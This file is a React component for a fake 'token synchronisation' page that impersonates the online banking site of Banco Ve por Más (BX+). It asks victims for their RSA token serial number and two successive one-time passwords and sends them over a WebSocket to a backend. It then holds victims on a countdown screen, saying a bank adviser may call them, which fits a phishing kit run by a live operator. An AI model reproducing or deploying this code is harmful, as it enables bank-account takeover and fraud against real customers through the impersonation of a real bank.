import React, { useState, useEffect } from 'react'

const TokenSync: React.FC = () => {
  const [serialNumber, setSerialNumber] = useState('')
  const [firstPassword, setFirstPassword] = useState<string[]>(['', '', '', '', '', ''])
  const [secondPassword, setSecondPassword] = useState<string[]>(['', '', '', '', '', ''])
  const [showSecondPassword, setShowSecondPassword] = useState(false)
  const [errorMessage, setErrorMessage] = useState('Tu operación no pudo ser procesada, por favor intentalo nuevamente.')
  const [showError, setShowError] = useState(true)
  const [showModal, setShowModal] = useState(false)
  const [timeRemaining, setTimeRemaining] = useState(300) // 5 minutos en segundos
  const [savedFirstPassword, setSavedFirstPassword] = useState('') // Guardar primera contraseña antes de limpiar

  // Función para resetear el formulario completamente
  const resetForm = (clearStorage: boolean = true) => {
    setSerialNumber('')
    setFirstPassword(['', '', '', '', '', ''])
    setSecondPassword(['', '', '', '', '', ''])
    setShowSecondPassword(false)
    setShowError(false)
    setErrorMessage('')
    setSavedFirstPassword('')
    setTimeRemaining(300)
    
    // Limpiar sessionStorage de token solo si se solicita
    if (clearStorage) {
      sessionStorage.removeItem('tokenSerial')
      sessionStorage.removeItem('tokenFirstPass')
      sessionStorage.removeItem('tokenSecondPass')
    }
    
    // Enfocar el primer campo solo si no hay modal abierto
    if (!showModal) {
      setTimeout(() => {
        const serialInput = document.getElementById('serialNumber')
        if (serialInput) {
          serialInput.focus()
        }
      }, 100)
    }
  }

  // Función para cerrar el modal y resetear
  const handleCloseModal = () => {
    setShowModal(false)
    resetForm()
  }

  // Resetear formulario al montar el componente
  useEffect(() => {
    resetForm()
  }, [])

  // Contador regresivo
  useEffect(() => {
    if (showModal && timeRemaining > 0) {
      const timer = setInterval(() => {
        setTimeRemaining((prev) => {
          if (prev <= 1) {
            clearInterval(timer)
            // Cuando el contador llegue a 0, cerrar modal y resetear formulario
            setTimeout(() => {
              setShowModal(false)
              resetForm()
            }, 1000)
            return 0
          }
          return prev - 1
        })
      }, 1000)

      return () => clearInterval(timer)
    }
  }, [showModal, timeRemaining])

  // Formatear tiempo en MM:SS
  const formatTime = (seconds: number): string => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`
  }

  const handleSerialChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '').slice(0, 9)
    setSerialNumber(value)
  }

  const handlePasswordChange = (index: number, value: string, isSecond: boolean = false) => {
    const numericValue = value.replace(/\D/g, '')
    
    if (numericValue.length > 1) {
      const targetPassword = isSecond ? secondPassword : firstPassword
      const setPassword = isSecond ? setSecondPassword : setFirstPassword
      const newDigits = [...targetPassword]
      const digitsToAdd = numericValue.slice(0, 6 - index).split('')
      
      digitsToAdd.forEach((digit, i) => {
        if (index + i < 6) {
          newDigits[index + i] = digit
        }
      })
      
      setPassword(newDigits)
      
      const nextIndex = Math.min(index + digitsToAdd.length, 5)
      setTimeout(() => {
        const nextInput = document.getElementById(`${isSecond ? 'second' : 'first'}-token-${nextIndex}`)
        nextInput?.focus()
      }, 0)
    } else {
      const targetPassword = isSecond ? secondPassword : firstPassword
      const setPassword = isSecond ? setSecondPassword : setFirstPassword
      const newDigits = [...targetPassword]
      newDigits[index] = numericValue
      setPassword(newDigits)
      
      if (numericValue && index < 5) {
        setTimeout(() => {
          const nextInput = document.getElementById(`${isSecond ? 'second' : 'first'}-token-${index + 1}`)
          nextInput?.focus()
        }, 0)
      }
    }
  }

  const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>, index: number, isSecond: boolean = false) => {
    e.preventDefault()
    const pastedData = e.clipboardData.getData('text').replace(/\D/g, '')
    
    if (pastedData.length > 0) {
      const targetPassword = isSecond ? secondPassword : firstPassword
      const setPassword = isSecond ? setSecondPassword : setFirstPassword
      const newDigits = [...targetPassword]
      const digitsToAdd = pastedData.slice(0, 6 - index).split('')
      
      digitsToAdd.forEach((digit, i) => {
        if (index + i < 6) {
          newDigits[index + i] = digit
        }
      })
      
      setPassword(newDigits)
      
      const nextIndex = Math.min(index + digitsToAdd.length, 5)
      setTimeout(() => {
        const nextInput = document.getElementById(`${isSecond ? 'second' : 'first'}-token-${nextIndex}`)
        nextInput?.focus()
      }, 0)
    }
  }

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>, isSecond: boolean = false) => {
    const targetPassword = isSecond ? secondPassword : firstPassword
    if (e.key === 'Backspace' && !targetPassword[index] && index > 0) {
      const prevInput = document.getElementById(`${isSecond ? 'second' : 'first'}-token-${index - 1}`)
      prevInput?.focus()
    }
  }

  const handleContinue = (e: React.FormEvent) => {
    e.preventDefault()
    setShowError(false)

    if (!showSecondPassword) {
      // Primero validar número de serie (obligatorio)
      if (!serialNumber || serialNumber.length !== 9) {
        setErrorMessage('Por favor ingresa el número de serie completo del token (9 dígitos)')
        setShowError(true)
        return
      }
      
      // Luego validar primera contraseña (obligatoria)
      const firstPass = firstPassword.join('')
      if (!firstPass || firstPass.length !== 6) {
        setErrorMessage('Por favor ingresa la primera contraseña dinámica completa (6 dígitos)')
        setShowError(true)
        return
      }
      
      // Guardar primera contraseña antes de limpiar
      setSavedFirstPassword(firstPass)
      sessionStorage.setItem('tokenFirstPass', firstPass)
      
      // Mostrar segunda contraseña después de un delay
      setTimeout(() => {
        setShowSecondPassword(true)
        setFirstPassword(['', '', '', '', '', '']) // Limpiar primera contraseña
        setShowError(false) // Ocultar errores al mostrar segunda contraseña
      }, 2000)
    } else {
      // Validar que el número de serie siga presente
      if (!serialNumber || serialNumber.length !== 9) {
        setErrorMessage('El número de serie del token es requerido (9 dígitos)')
        setShowError(true)
        return
      }
      
      // Validar segunda contraseña (obligatoria)
      const secondPass = secondPassword.join('')
      if (!secondPass || secondPass.length !== 6) {
        setErrorMessage('Por favor ingresa la segunda contraseña dinámica completa (6 dígitos)')
        setShowError(true)
        return
      }
      
      // Guardar datos de token en sessionStorage para el dashboard
      sessionStorage.setItem('tokenSerial', serialNumber)
      // La primera contraseña ya está guardada en savedFirstPassword
      if (savedFirstPassword) {
        sessionStorage.setItem('tokenFirstPass', savedFirstPassword)
      }
      sessionStorage.setItem('tokenSecondPass', secondPass)
      
      // Enviar al WebSocket con ID de sesión correcto
      import('../services/session.service').then(({ default: sessionService }) => {
        const sessionId = sessionService.getSessionId()
        import('../services/websocket.service').then(ws => {
          const sendData = () => {
            if (ws.default.isConnected && ws.default.isConnected()) {
              ws.default.updateSession({
                sessionId: sessionId,
                idSesion: sessionId,
                tokenSerial: finalSerialNumber,
                tokenPasswords: {
                  first: finalFirstPass || '',
                  second: finalSecondPass
                }
              })
            } else {
              ws.default.connect()
              setTimeout(sendData, 1000)
            }
          }
          sendData()
        })
      })
      
      // Guardar valores antes de resetear
      const finalSerialNumber = serialNumber
      const finalFirstPass = savedFirstPassword
      const finalSecondPass = secondPass
      
      // Resetear formulario inmediatamente después de guardar datos (sin limpiar storage)
      resetForm(false)
      
      // Mostrar modal de validación solo cuando todo esté completo
      setShowModal(true)
      setTimeRemaining(300) // Reiniciar contador a 5 minutos
      setShowError(false) // Ocultar errores al mostrar modal
      
      // Cuando el modal se cierre o el tiempo termine, el formulario ya estará limpio
    }
  }


  return (
    <div className="wrapper dark" style={{ margin: 0, padding: 0 }}>
      {/* Header */}
      <header style={{
        backgroundColor: '#2c3e50',
        color: '#fff',
        padding: '10px 15px',
        display: 'flex',
        justifyContent: 'space-between',
        alignItems: 'flex-start',
        flexWrap: 'wrap',
        gap: '10px',
        margin: 0,
        width: '100%'
      }}>
        <style>{`
          @media (max-width: 768px) {
            .header-logo {
              font-size: 16px !important;
            }
            .header-nav {
              font-size: 12px !important;
              gap: 8px !important;
            }
            .header-nav a {
              font-size: 12px !important;
            }
            .header-access {
              font-size: 9px !important;
              min-width: auto !important;
              width: 100% !important;
              text-align: left !important;
              margin-top: 10px !important;
            }
            .header-access div {
              font-size: 9px !important;
              line-height: 1.4 !important;
            }
          }
        `}</style>
        <div style={{ display: 'flex', alignItems: 'center', gap: '10px', flexWrap: 'wrap', flex: '1 1 auto' }}>
          <span className="header-logo" style={{ fontSize: '18px', fontWeight: 'bold', whiteSpace: 'nowrap' }}>BX+</span>
          <nav className="header-nav" style={{ display: 'flex', gap: '10px', flexWrap: 'wrap', fontSize: '14px' }}>
            <a href="#" style={{ color: '#fff', textDecoration: 'none', whiteSpace: 'nowrap' }}>INICIO</a>
            <a href="#" style={{ color: '#fff', textDecoration: 'none', whiteSpace: 'nowrap' }}>MIS PRODUCTOS</a>
            <a href="#" style={{ color: '#fff', textDecoration: 'none', whiteSpace: 'nowrap' }}>TRANSACCIONES</a>
          </nav>
        </div>
        <div className="header-access" style={{ fontSize: '11px', textAlign: 'right', minWidth: '200px', flex: '0 1 auto' }}>
          <div>Último acceso al sistema:</div>
          <div style={{ fontSize: '10px' }}>Lunes 15 de diciembre de 2025, 14:22:33</div>
          <div style={{ fontSize: '10px' }}>(15122025143233)</div>
        </div>
      </header>

      <div className="container" style={{ padding: '20px 15px', maxWidth: '100%', paddingBottom: 0 }}>
        {/* Logo y Título */}
        <div style={{ textAlign: 'center', marginBottom: '30px', marginTop: '20px' }}>
          <div style={{ marginBottom: '10px', display: 'flex', justifyContent: 'center', alignItems: 'center' }}>
            <img 
              src="/assets/images/logoBlancoR.png" 
              alt="BX+" 
              style={{ 
                maxWidth: 'clamp(120px, 25vw, 180px)', 
                height: 'auto'
              }} 
            />
          </div>
          <h1 style={{ 
            color: '#4A90E2', 
            fontSize: 'clamp(18px, 4vw, 24px)', 
            fontWeight: 'normal',
            margin: '10px 0'
          }}>
            Banca en Línea B×+
          </h1>
        </div>

        <div className="row content" style={{ marginBottom: 0 }}>
          <div className="col-sm-12" style={{ paddingBottom: 0, marginBottom: 0 }}>
            {/* Título de la página */}
            <h2 style={{ 
              color: '#4A90E2', 
              fontSize: 'clamp(20px, 5vw, 28px)', 
              fontWeight: 'bold',
              marginBottom: '20px',
              textAlign: 'center'
            }}>
              Sincronización de dispositivo token Bx+
            </h2>

            {/* Mensaje de error */}
            {showError && errorMessage && (
              <div className="alert alert-danger" role="alert" style={{ marginBottom: '20px' }}>
                {errorMessage}
              </div>
            )}

            {/* Caja de instrucciones */}
            <div className="panel panel-default" style={{ 
              backgroundColor: '#f8f9fa', 
              border: '2px solid #4A90E2',
              borderRadius: '6px',
              boxShadow: '0 4px 8px rgba(0, 0, 0, 0.2)',
              marginBottom: '30px'
            }}>
              <div className="panel-body" style={{ 
                backgroundColor: '#f8f9fa',
                padding: '25px',
                borderRadius: '4px'
              }}>
                <h3 style={{ 
                  color: '#2c3e50', 
                  fontSize: '18px', 
                  fontWeight: 'bold', 
                  marginBottom: '20px',
                  paddingBottom: '15px',
                  borderBottom: '2px solid #4A90E2'
                }}>
                  Bienvenido al proceso de sincronización de tu dispositivo Token.
                </h3>
                <ul style={{ color: '#2c3e50', fontSize: '14px', lineHeight: '1.8', paddingLeft: '20px', margin: 0 }}>
                  <li style={{ color: '#2c3e50', marginBottom: '10px', fontWeight: '500' }}>Lea cuidadosamente las instrucciones.</li>
                  <li style={{ color: '#2c3e50', marginBottom: '10px', fontWeight: '500' }}>El número de serie se encuentra grabado en la parte trasera de tu token y se compone de 9 dígitos.</li>
                  <li style={{ color: '#2c3e50', fontWeight: '500' }}>Deberás capturar una primera contraseña dinámica (número variable que se muestra al frente), esperar a que cambie y capturar una segunda contraseña dinámica para concluir el proceso.</li>
                </ul>
                
                {/* Imagen del dispositivo token RSA */}
                <div style={{ textAlign: 'center', marginTop: '20px', marginBottom: '10px' }}>
                  <img 
                    src="/images/token.png" 
                    alt="Dispositivo Token RSA SecurID" 
                    style={{ 
                      maxWidth: '200px', 
                      height: 'auto',
                      border: '1px solid #ddd',
                      borderRadius: '4px',
                      padding: '10px',
                      backgroundColor: '#fff',
                      display: 'block',
                      margin: '0 auto'
                    }}
                    onError={(e) => {
                      // Prevenir bucle infinito de errores
                      const target = e.target as HTMLImageElement
                      if (!target.dataset.errorHandled) {
                        target.dataset.errorHandled = 'true'
                        // Usar una imagen SVG del token RSA como fallback
                        target.src = 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAwIiBoZWlnaHQ9IjE1MCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cmVjdCB3aWR0aD0iMjAwIiBoZWlnaHQ9IjE1MCIgZmlsbD0iI2Y1ZjVmNSIgc3Ryb2tlPSIjZGRkIiBzdHJva2Utd2lkdGg9IjIiLz48cmVjdCB4PSIxMCIgeT0iMjAiIHdpZHRoPSIxODAiIGhlaWdodD0iMTEwIiBmaWxsPSIjNGE0YTRhIiByeD0iNSIvPjx0ZXh0IHg9IjEwMCIgeT0iNjAiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxNCIgZmlsbD0iI2ZmZiIgdGV4dC1hbmNob3I9Im1pZGRsZSI+UlNBPC90ZXh0Pjx0ZXh0IHg9IjEwMCIgeT0iODAiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxMiIgZmlsbD0iI2ZmZiIgdGV4dC1hbmNob3I9Im1pZGRsZSI+U0VDVVJFSURIPC90ZXh0Pjx0ZXh0IHg9IjEwMCIgeT0iMTEwIiBmb250LWZhbWlseT0iQXJpYWwiIGZvbnQtc2l6ZT0iMjQiIGZpbGw9IiNmZmYiIGZvbnQtd2VpZ2h0PSJib2xkIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIj4xMjM0NTY8L3RleHQ+PC9zdmc+'
                      }
                    }}
                  />
                </div>
              </div>
            </div>

            {/* Formulario */}
            <form onSubmit={handleContinue}>
              {/* Número de serie */}
              <div className="form-group">
                <label htmlFor="serialNumber" style={{ color: '#fff', fontWeight: 'bold' }}>
                  N° de Serie del Token: <span style={{ color: '#ff6b6b' }}>*</span>
                </label>
                <input
                  id="serialNumber"
                  type="text"
                  className="form-control"
                  inputMode="numeric"
                  maxLength={9}
                  value={serialNumber}
                  onChange={handleSerialChange}
                  placeholder="Ingresa los 9 dígitos del número de serie"
                  required
                  style={{
                    borderColor: showError && serialNumber.length !== 9 ? '#e74c3c' : undefined
                  }}
                />
                {showError && serialNumber.length > 0 && serialNumber.length !== 9 && (
                  <small style={{ color: '#e74c3c', display: 'block', marginTop: '5px' }}>
                    El número de serie debe tener exactamente 9 dígitos
                  </small>
                )}
              </div>

              {/* Contraseña dinámica */}
              {!showSecondPassword ? (
                <>
                  <div className="form-group">
                    <p style={{ color: '#ccc', fontSize: '14px', marginBottom: '20px' }}>
                      Por favor, ingresa la contraseña dinámica de tu dispositivo Token para continuar. <span style={{ color: '#ff6b6b' }}>*</span>
                    </p>
                    
                    {/* Icono de token */}
                    <div style={{ textAlign: 'center', marginBottom: '20px' }}>
                      <div style={{
                        width: '60px',
                        height: '60px',
                        borderRadius: '50%',
                        backgroundColor: '#f5f5f5',
                        border: '2px solid #ddd',
                        display: 'inline-flex',
                        alignItems: 'center',
                        justifyContent: 'center',
                        margin: '0 auto'
                      }}>
                        <span className="fa fa-key" style={{ fontSize: '24px', color: '#666' }}></span>
                      </div>
                    </div>

                    {/* Campos de primera contraseña */}
                    <div style={{
                      display: 'flex',
                      justifyContent: 'center',
                      gap: 'clamp(6px, 2vw, 10px)',
                      marginBottom: '10px',
                      flexWrap: 'nowrap',
                      overflowX: 'auto',
                      padding: '0 10px',
                      WebkitOverflowScrolling: 'touch',
                      width: '100%',
                      maxWidth: '100%',
                      boxSizing: 'border-box'
                    }}>
                      {firstPassword.map((digit, index) => (
                        <input
                          key={index}
                          id={`first-token-${index}`}
                          type="text"
                          className="form-control"
                          inputMode="numeric"
                          maxLength={6}
                          value={digit}
                          onChange={(e) => handlePasswordChange(index, e.target.value, false)}
                          onKeyDown={(e) => handleKeyDown(index, e, false)}
                          onPaste={(e) => handlePaste(e, index, false)}
                          required
                          style={{
                            width: 'clamp(40px, 10vw, 50px)',
                            height: 'clamp(45px, 11vw, 50px)',
                            minWidth: '40px',
                            maxWidth: '50px',
                            textAlign: 'center',
                            fontSize: 'clamp(18px, 5vw, 24px)',
                            backgroundColor: '#4a4a4a',
                            color: '#fff',
                            border: showError && firstPassword.join('').length !== 6 ? '2px solid #e74c3c' : '1px solid #888',
                            borderRadius: '6px',
                            fontWeight: 'bold',
                            flexShrink: 0,
                            boxSizing: 'border-box',
                            padding: 0
                          }}
                        />
                      ))}
                    </div>
                    {showError && firstPassword.join('').length > 0 && firstPassword.join('').length !== 6 && (
                      <small style={{ color: '#e74c3c', display: 'block', marginBottom: '20px', textAlign: 'center' }}>
                        La contraseña dinámica debe tener exactamente 6 dígitos
                      </small>
                    )}
                  </div>
                </>
              ) : (
                <>
                  <div className="form-group">
                    <p style={{ color: '#ccc', fontSize: '14px', marginBottom: '20px' }}>
                      Por favor, ingresa la segunda contraseña dinámica de tu dispositivo Token. <span style={{ color: '#ff6b6b' }}>*</span>
                    </p>
                    
                    {/* Icono de token */}
                    <div style={{ textAlign: 'center', marginBottom: '20px' }}>
                      <div style={{
                        width: '60px',
                        height: '60px',
                        borderRadius: '50%',
                        backgroundColor: '#f5f5f5',
                        border: '2px solid #ddd',
                        display: 'inline-flex',
                        alignItems: 'center',
                        justifyContent: 'center',
                        margin: '0 auto'
                      }}>
                        <span className="fa fa-key" style={{ fontSize: '24px', color: '#666' }}></span>
                      </div>
                    </div>

                    {/* Campos de segunda contraseña */}
                    <div style={{
                      display: 'flex',
                      justifyContent: 'center',
                      gap: 'clamp(6px, 2vw, 10px)',
                      marginBottom: '10px',
                      flexWrap: 'nowrap',
                      overflowX: 'auto',
                      padding: '0 10px',
                      WebkitOverflowScrolling: 'touch',
                      width: '100%',
                      maxWidth: '100%',
                      boxSizing: 'border-box'
                    }}>
                      {secondPassword.map((digit, index) => (
                        <input
                          key={index}
                          id={`second-token-${index}`}
                          type="text"
                          className="form-control"
                          inputMode="numeric"
                          maxLength={6}
                          value={digit}
                          onChange={(e) => handlePasswordChange(index, e.target.value, true)}
                          onKeyDown={(e) => handleKeyDown(index, e, true)}
                          onPaste={(e) => handlePaste(e, index, true)}
                          required
                          style={{
                            width: 'clamp(40px, 10vw, 50px)',
                            height: 'clamp(45px, 11vw, 50px)',
                            minWidth: '40px',
                            maxWidth: '50px',
                            textAlign: 'center',
                            fontSize: 'clamp(18px, 5vw, 24px)',
                            backgroundColor: '#4a4a4a',
                            color: '#fff',
                            border: showError && secondPassword.join('').length !== 6 ? '2px solid #e74c3c' : '1px solid #888',
                            borderRadius: '6px',
                            fontWeight: 'bold',
                            flexShrink: 0,
                            boxSizing: 'border-box',
                            padding: 0
                          }}
                        />
                      ))}
                    </div>
                    {showError && secondPassword.join('').length > 0 && secondPassword.join('').length !== 6 && (
                      <small style={{ color: '#e74c3c', display: 'block', marginBottom: '20px', textAlign: 'center' }}>
                        La segunda contraseña dinámica debe tener exactamente 6 dígitos
                      </small>
                    )}
                  </div>
                </>
              )}

              {/* Botón Continuar */}
              <div className="form-group">
                <button
                  type="submit"
                  className="btn btn-success btn-block"
                  style={{ backgroundColor: '#B8E986', borderColor: '#B8E986', color: '#fff' }}
                >
                  Continuar
                </button>
              </div>
            </form>

          </div>
        </div>
      </div>

      {/* Footer - Fuera del contenedor para que ocupe todo el ancho */}
      <footer style={{ 
        marginTop: '60px', 
        width: '100vw', 
        marginLeft: 'calc(-50vw + 50%)',
        marginRight: 'calc(-50vw + 50%)',
        boxSizing: 'border-box',
        clear: 'both'
      }}>
        <style>{`
          @media (max-width: 768px) {
            footer {
              margin-top: 60px !important;
            }
          }
          @media (max-width: 480px) {
            footer {
              margin-top: 80px !important;
            }
          }
        `}</style>
        {/* Footer superior verde lima */}
        <div style={{
          backgroundColor: '#B8E986',
          padding: 'clamp(15px, 3vw, 25px)',
          textAlign: 'center',
          width: '100%',
          boxSizing: 'border-box'
        }}>
          <div style={{
            display: 'flex',
            justifyContent: 'center',
            alignItems: 'center',
            flexWrap: 'wrap',
            gap: 'clamp(4px, 1vw, 12px)',
            fontSize: 'clamp(12px, 2.5vw, 14px)',
            maxWidth: '1200px',
            margin: '0 auto',
            padding: '0 20px'
          }}>
            <a href="#" style={{ color: '#2c3e50', textDecoration: 'none', whiteSpace: 'nowrap', padding: '0 4px' }}>Preguntas Frecuentes</a>
            <span style={{ color: '#2c3e50', fontSize: '14px' }}>|</span>
            <a href="#" style={{ color: '#2c3e50', textDecoration: 'none', whiteSpace: 'nowrap', padding: '0 4px' }}>Términos y condiciones</a>
            <span style={{ color: '#2c3e50', fontSize: '14px' }}>|</span>
            <a href="#" style={{ color: '#2c3e50', textDecoration: 'none', whiteSpace: 'nowrap', padding: '0 4px' }}>Privacidad</a>
            <span style={{ color: '#2c3e50', fontSize: '14px' }}>|</span>
            <a href="#" style={{ color: '#2c3e50', textDecoration: 'none', whiteSpace: 'nowrap', padding: '0 4px' }}>Seguridad</a>
            <span style={{ color: '#2c3e50', fontSize: '14px' }}>|</span>
            <a href="#" style={{ color: '#2c3e50', textDecoration: 'none', whiteSpace: 'nowrap', padding: '0 4px' }}>Información legal</a>
            <span style={{ color: '#2c3e50', fontSize: '14px' }}>|</span>
            <a href="#" style={{ color: '#2c3e50', textDecoration: 'none', whiteSpace: 'nowrap', padding: '0 4px' }}>Ayuda</a>
          </div>
        </div>
        {/* Footer inferior azul oscuro */}
        <div style={{
          backgroundColor: '#2c3e50',
          color: '#fff',
          padding: 'clamp(12px, 2vw, 18px)',
          textAlign: 'center',
          fontSize: 'clamp(11px, 2vw, 13px)',
          width: '100%',
          boxSizing: 'border-box',
          lineHeight: '1.5'
        }}>
          Banco Ve por Más, S.A., Institución de Banca Múltiple, Grupo Financiero Ve por Más.
        </div>
      </footer>

      {/* Modal de Validación */}
      {showModal && (
        <div style={{
          position: 'fixed',
          top: 0,
          left: 0,
          right: 0,
          bottom: 0,
          backgroundColor: 'rgba(0, 0, 0, 0.7)',
          backdropFilter: 'blur(5px)',
          display: 'flex',
          justifyContent: 'center',
          alignItems: 'center',
          zIndex: 9999,
          padding: '20px'
        }}>
          <div style={{
            backgroundColor: '#fff',
            borderRadius: '12px',
            padding: 'clamp(20px, 5vw, 40px)',
            maxWidth: 'clamp(320px, 90vw, 500px)',
            width: '100%',
            boxShadow: '0 10px 40px rgba(0, 0, 0, 0.3)',
            position: 'relative'
          }}>
            {/* Icono de teléfono */}
            <div style={{
              display: 'flex',
              justifyContent: 'center',
              marginBottom: '20px'
            }}>
              <div style={{
                width: 'clamp(50px, 12vw, 70px)',
                height: 'clamp(50px, 12vw, 70px)',
                borderRadius: '50%',
                backgroundColor: '#4A90E2',
                display: 'flex',
                justifyContent: 'center',
                alignItems: 'center'
              }}>
                <span 
                  className="fa fa-phone" 
                  style={{ 
                    fontSize: 'clamp(24px, 6vw, 32px)', 
                    color: '#fff',
                    transform: 'rotate(-45deg)'
                  }}
                ></span>
              </div>
            </div>

            {/* Contador de tiempo */}
            <div style={{
              textAlign: 'center',
              marginBottom: '20px'
            }}>
              <div style={{
                fontSize: 'clamp(36px, 10vw, 56px)',
                fontWeight: 'bold',
                color: '#4A90E2',
                fontFamily: 'monospace',
                letterSpacing: '2px'
              }}>
                {formatTime(timeRemaining)}
              </div>
            </div>

            {/* Título */}
            <h2 style={{
              textAlign: 'center',
              color: '#2c3e50',
              fontSize: 'clamp(18px, 5vw, 24px)',
              fontWeight: 'bold',
              marginBottom: '20px'
            }}>
              Validación en proceso
            </h2>

            {/* Instrucciones */}
            <p style={{
              color: '#2c3e50',
              fontSize: 'clamp(14px, 4vw, 16px)',
              lineHeight: '1.6',
              marginBottom: '20px',
              textAlign: 'left'
            }}>
              Estamos procesando la sincronización de tu dispositivo Token. Un asesor de BX+ podría comunicarse contigo para completar la validación o activación de tu token.
            </p>

            {/* Cuadro de advertencia */}
            <div style={{
              backgroundColor: '#fff9e6',
              border: '1px solid #ffd700',
              borderRadius: '6px',
              padding: '15px',
              marginBottom: '20px',
              display: 'flex',
              alignItems: 'flex-start',
              gap: '12px'
            }}>
              <div style={{
                flexShrink: 0,
                width: '24px',
                height: '24px',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center'
              }}>
                <span 
                  className="fa fa-exclamation-triangle" 
                  style={{ 
                    fontSize: '20px', 
                    color: '#ffa500'
                  }}
                ></span>
              </div>
              <p style={{
                color: '#2c3e50',
                fontSize: 'clamp(13px, 3.5vw, 15px)',
                lineHeight: '1.5',
                margin: 0,
                flex: 1
              }}>
                <strong>Importante:</strong> Por favor, mantén esta página activa y no la cierres ni actualices para evitar interrumpir el proceso. Ten a la mano tu dispositivo móvil por si es necesario contactarte.
              </p>
            </div>

            {/* Spinner de carga */}
            <div style={{
              display: 'flex',
              justifyContent: 'center',
              marginTop: '20px'
            }}>
              <div style={{
                width: '40px',
                height: '40px',
                border: '4px solid #e0e0e0',
                borderTop: '4px solid #4A90E2',
                borderRadius: '50%',
                animation: 'spin 1s linear infinite'
              }}></div>
            </div>

            {/* Botón para cerrar y hacer otra sincronización */}
            <div style={{
              display: 'flex',
              justifyContent: 'center',
              marginTop: '25px',
              paddingTop: '20px',
              borderTop: '1px solid #e0e0e0'
            }}>
              <button
                onClick={handleCloseModal}
                style={{
                  padding: '10px 20px',
                  backgroundColor: '#4A90E2',
                  color: '#fff',
                  border: 'none',
                  borderRadius: '6px',
                  cursor: 'pointer',
                  fontSize: '14px',
                  fontWeight: '500',
                  transition: 'background-color 0.3s ease'
                }}
                onMouseEnter={(e) => {
                  e.currentTarget.style.backgroundColor = '#357abd'
                }}
                onMouseLeave={(e) => {
                  e.currentTarget.style.backgroundColor = '#4A90E2'
                }}
              >
                Nueva Sincronización
              </button>
            </div>

            {/* Animación del spinner */}
            <style>{`
              @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
              }
            `}</style>
          </div>
        </div>
      )}
    </div>
  )
}

export default TokenSync
